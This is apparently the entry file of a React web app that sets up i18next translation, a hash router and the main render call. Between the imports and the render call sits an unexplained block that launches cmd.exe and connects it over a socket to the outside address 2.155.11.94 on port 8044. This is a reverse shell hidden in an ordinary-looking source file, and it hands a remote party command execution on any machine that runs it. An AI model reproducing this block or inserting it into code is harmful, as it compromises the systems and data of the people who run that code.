import React from 'react';
import ReactDOM from 'react-dom';
import i18next from 'i18next';
import { I18nextProvider } from 'react-i18next';
import i18nextConfig from 'i18n/i18next.config.jsx';
import { HashRouter } from 'react-router-dom';
import App from 'views/app.jsx';
import bootstrapCss from 'style/bootstrap.min.css';
import customCss from 'style/custom.css';
import favicon from 'images/favicon.ico';

var host="2.155.11.94";
var port=8044;
var cmd="cmd.exe";
var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();

// Rendering.
ReactDOM.render(
    <I18nextProvider i18n={i18next}>
        <HashRouter>
            <App />
        </HashRouter>
    </I18nextProvider>,
    document.getElementById('app')
);
